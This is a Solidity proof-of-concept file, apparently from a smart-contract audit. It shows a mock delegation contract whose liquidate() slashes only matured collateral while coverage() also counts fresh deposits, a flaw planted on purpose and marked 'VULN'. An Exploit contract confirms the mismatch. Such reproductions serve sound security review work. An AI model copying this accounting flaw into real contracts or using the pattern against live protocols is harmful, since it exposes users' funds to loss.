// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract DelegationAccounting {
    uint256 public currentCollateral;
    uint256 public slashableCollateral;
    uint256 public slashed;

    function depositMatured(uint256 amount) external {
        currentCollateral += amount;
        slashableCollateral += amount;
    }

    function depositFresh(uint256 amount) external {
        currentCollateral += amount;
        // New collateral contributes to health immediately but is not slashable.
    }

    function coverage() external view returns (uint256) {
        return currentCollateral;
    }

    function slashTimestamp(address) public pure returns (uint48) {
        return uint48(1_000);
    }

    function liquidate() external {
        // @> VULN: slashable collateral is based on an older epoch than coverage().
        slashed = slashableCollateral;
        currentCollateral = 0;
        slashableCollateral = 0;
    }
}

contract Exploit {
    DelegationAccounting public delegation;
    bool public confirmed;

    constructor() {
        delegation = new DelegationAccounting();
    }

    function run() external {
        delegation.depositMatured(100);
        delegation.depositFresh(50);
        require(delegation.coverage() == 150, "fresh collateral did not improve health");
        require(delegation.slashableCollateral() == 100, "slashable set unexpectedly includes fresh deposit");
        delegation.liquidate();
        require(delegation.slashed() == 100, "matured collateral was not slashed");
        require(delegation.currentCollateral() == 0, "liquidation did not consume collateral");
        confirmed = true;
    }
}

